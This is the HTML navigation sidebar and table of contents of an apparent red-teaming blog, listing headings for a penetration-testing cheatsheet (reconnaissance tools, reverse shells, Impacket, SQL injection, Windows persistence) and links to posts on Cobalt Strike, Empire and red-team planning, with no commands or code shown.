  <a href="#empire" class="md-nav__link">
    <span class="md-ellipsis">
      EMPIRE
    </span>
  </a>
  
    <nav class="md-nav" aria-label="EMPIRE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c2-profiles" class="md-nav__link">
    <span class="md-ellipsis">
      C2 Profiles
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    <span class="md-ellipsis">
      Linux
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Linux">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash" class="md-nav__link">
    <span class="md-ellipsis">
      BASH
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-persistence-ideas" class="md-nav__link">
    <span class="md-ellipsis">
      Linux Persistence Ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpcclient" class="md-nav__link">
    <span class="md-ellipsis">
      rpcclient
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iptables" class="md-nav__link">
    <span class="md-ellipsis">
      iptables
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldapsearch" class="md-nav__link">
    <span class="md-ellipsis">
      ldapsearch
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs" class="md-nav__link">
    <span class="md-ellipsis">
      NFS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shells" class="md-nav__link">
    <span class="md-ellipsis">
      Shells
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shells">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tty-shells" class="md-nav__link">
    <span class="md-ellipsis">
      TTY Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bind-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Bind Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reverse-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse Shells
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-tunnels" class="md-nav__link">
    <span class="md-ellipsis">
      SSH Tunnels
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    <span class="md-ellipsis">
      Impacket
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Impacket">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#install-impacket-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Install impacket on Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#secretsdump" class="md-nav__link">
    <span class="md-ellipsis">
      Secretsdump
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getuserspnspy" class="md-nav__link">
    <span class="md-ellipsis">
      GetUserSPNS.py
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbrelayxpy" class="md-nav__link">
    <span class="md-ellipsis">
      SMBRelayx.py
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-force-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Brute Force Techniques
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      Web Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql" class="md-nav__link">
    <span class="md-ellipsis">
      SQL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sqli-examples" class="md-nav__link">
    <span class="md-ellipsis">
      SQLi Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQLi Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-joins" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Joins
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql" class="md-nav__link">
    <span class="md-ellipsis">
      MySQL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="MySQL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#udf-install-for-command-execution" class="md-nav__link">
    <span class="md-ellipsis">
      UDF Install for Command Execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlmap" class="md-nav__link">
    <span class="md-ellipsis">
      SQLMap
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss" class="md-nav__link">
    <span class="md-ellipsis">
      XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-javascript-injection-via-node-or-elementjs" class="md-nav__link">
    <span class="md-ellipsis">
      Server-side Javascript Injection via Node or ElementJS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cold-fusion" class="md-nav__link">
    <span class="md-ellipsis">
      Cold Fusion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    <span class="md-ellipsis">
      Java
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Java">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jboss" class="md-nav__link">
    <span class="md-ellipsis">
      JBOSS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-deserialization" class="md-nav__link">
    <span class="md-ellipsis">
      Java Deserialization
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Java Deserialization">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jmxinvokerservlet" class="md-nav__link">
    <span class="md-ellipsis">
      JMXInvokerServlet
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PHP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php-type-juggling" class="md-nav__link">
    <span class="md-ellipsis">
      PHP Type Juggling
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-sockets" class="md-nav__link">
    <span class="md-ellipsis">
      Web Sockets
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      Misc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#decompiling-net-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      Decompiling .NET Binaries
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#canary-tokens" class="md-nav__link">
    <span class="md-ellipsis">
      Canary Tokens
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python-ssl-web-server" class="md-nav__link">
    <span class="md-ellipsis">
      Python SSL Web Server
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mcafee-sitelistxml-decryption" class="md-nav__link">
    <span class="md-ellipsis">
      McAfee SiteList.xml decryption
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tightvnc-password-retrieval" class="md-nav__link">
    <span class="md-ellipsis">
      TightVNC Password Retrieval
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-lists" class="md-nav__link">
    <span class="md-ellipsis">
      Password Lists
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aix-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      AIX Passwords
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-ntlm-hash-from-mac-cli" class="md-nav__link">
    <span class="md-ellipsis">
      Create NTLM Hash from Mac CLI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash-cracking-examples" class="md-nav__link">
    <span class="md-ellipsis">
      Hash Cracking Examples
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Hashes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2018
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            2018
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2018/a-deep-dive-into-cobalt-strike-malleable-c2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    A Deep Dive into Cobalt Strike Malleable C2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Threat Get's a Vote - Applying a Threat-Based Approach to Security Testing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Threat Mitagation Strategies - Part 2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2018/threat-mitigation-strategies-observations-recommendations/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Threat Mitagation Strategies - Part 1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2018/hostenum-updates-usage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HostEnum - Updates and Usage Guide
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
        
          
          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2017
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4">
            <span class="md-nav__icon md-icon"></span>
            2017
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2017/install-bloodhound-ubuntu/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Install BloodHound on Ubuntu
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2017/empire-modifying-server-c2-indicators/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Empire Modifying Server C2 Indicators
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2017/invoke-hostenum/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Invoke-Hostenum
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2017/leveraging-expired-domains-for-red-team-engagements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Leveraging Expired Domains for Red Team Engagements
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
        
          
          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2016
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5">
            <span class="md-nav__icon md-icon"></span>
            2016
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2016/slack-notifications-for-cobalt-strike/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Slack Notifications for Cobalt Strike
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2016/web-shells-covert-channel/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SubShell and TinyShell - Custom Covert Webshells
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2016/new-information-security-red-teaming-blog-threat-express-minis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    New Information Security and Red Teaming Blog Threat Express by MINIS
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Red Teaming
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Red Teaming
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/redteaming/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    What is Red Teaming
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/red_vs_pen_vs_vuln/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Red vs Pen vs Vuln
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/rolesandrelationships/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roles and Relationships
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/mitre_attack/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Red Teaming and MITRE ATT&CK
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/definitions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Definitions
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_6" >
        
          
          <label class="md-nav__link" for="__nav_4_6" id="__nav_4_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Red Team Planning
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_6">
            <span class="md-nav__icon md-icon"></span>
            Red Team Planning
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/redteamplanning/goalplanning/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Goal Planing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/redteamplanning/redteamchecklist/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Red Team Checklist
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/redteamplanning/roeguide/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Red Team ROE Guide
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/redteamplanning/tradecraft/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tradecraft Guidance
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_7" >
        
          
          <label class="md-nav__link" for="__nav_4_7" id="__nav_4_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Red Team IOCs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_7">
            <span class="md-nav__icon md-icon"></span>
            Red Team IOCs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/tool_ioc/tinyshell_ioc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TinyShell IOCs
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/tool_ioc/psexec/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PSEXEC IOCs
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    JPCert IOCs
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SANS Hunt Evil
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_8" >
        
          
          <label class="md-nav__link" for="__nav_4_8" id="__nav_4_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Red Team Resources
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_8">
            <span class="md-nav__icon md-icon"></span>
            Red Team Resources
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/cheatsheets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cheatsheets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/resources/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    General Resources
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/windowsactivedirectory/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Attack Active Directory
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteaming/videos/videos/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Red Team Videos
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../archive/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Post Archive
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../contributors/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Contributors
    
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#foca" class="md-nav__link">
    <span class="md-ellipsis">
      FOCA
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#maltego" class="md-nav__link">
    <span class="md-ellipsis">
      Maltego
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconng" class="md-nav__link">
    <span class="md-ellipsis">
      ReconNG
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metagoofil" class="md-nav__link">
    <span class="md-ellipsis">
      Metagoofil
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#censysio" class="md-nav__link">
    <span class="md-ellipsis">
      censys.io
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Network Scanning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Network Scanning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsnrecon" class="md-nav__link">
    <span class="md-ellipsis">
      dsnrecon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#theharvester" class="md-nav__link">
    <span class="md-ellipsis">
      TheHarvester
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Nmap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      IDS Evasion
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#eyewitness" class="md-nav__link">
    <span class="md-ellipsis">
      Eyewitness
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows" class="md-nav__link">
    <span class="md-ellipsis">
      Windows
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#built-in-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Built-in Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Built-in Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsquery" class="md-nav__link">
    <span class="md-ellipsis">
      DSQUERY
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlcmd" class="md-nav__link">
    <span class="md-ellipsis">
      SQLCMD
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsutil" class="md-nav__link">
    <span class="md-ellipsis">
      NTDSUTIL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    <span class="md-ellipsis">
      Applocker
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appcmd" class="md-nav__link">
    <span class="md-ellipsis">
      APPCMD
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Lateral Movement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-persistence-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Persistence Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Persistence Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#registry-keys" class="md-nav__link">
    <span class="md-ellipsis">
      Registry Keys
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Registry Keys">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modify-registry-keys" class="md-nav__link">
    <span class="md-ellipsis">
      Modify registry keys
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Modify registry keys">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#userinit-key" class="md-nav__link">
    <span class="md-ellipsis">
      Userinit Key
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-key" class="md-nav__link">
    <span class="md-ellipsis">
      Run Key
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" class="md-nav__link">
    <span class="md-ellipsis">
      List Image File Execution Options (Debugger file executed when the target file is run)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appinit_dlls" class="md-nav__link">
    <span class="md-ellipsis">
      AppInit_DLLs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-reboot-sethcutilman-option-using-a-debugger-key" class="md-nav__link">
    <span class="md-ellipsis">
      No-reboot sethc/utilman option using a "debugger" key
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-storage-locations" class="md-nav__link">
    <span class="md-ellipsis">
      File Storage Locations
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Storage Locations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-folders" class="md-nav__link">
    <span class="md-ellipsis">
      Startup Folders
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sethcutilman-replacement" class="md-nav__link">
    <span class="md-ellipsis">
      SETHC/UTILMAN Replacement
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#volume-shadow-copy-restore-points" class="md-nav__link">
    <span class="md-ellipsis">
      Volume Shadow Copy (Restore Points)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vssadmin-native-windows-utility" class="md-nav__link">
    <span class="md-ellipsis">
      VSSADMIN - native windows utility
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" class="md-nav__link">
    <span class="md-ellipsis">
      Use WMIC process call to run an .exe from a Volume Shadow Copy
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task-scheduling" class="md-nav__link">
    <span class="md-ellipsis">
      Task Scheduling
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task Scheduling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#at" class="md-nav__link">
    <span class="md-ellipsis">
      AT
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schtasks" class="md-nav__link">
    <span class="md-ellipsis">
      SCHTASKS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#additional-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Additional Notes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-service" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      DLL-Hijacking
    </span>
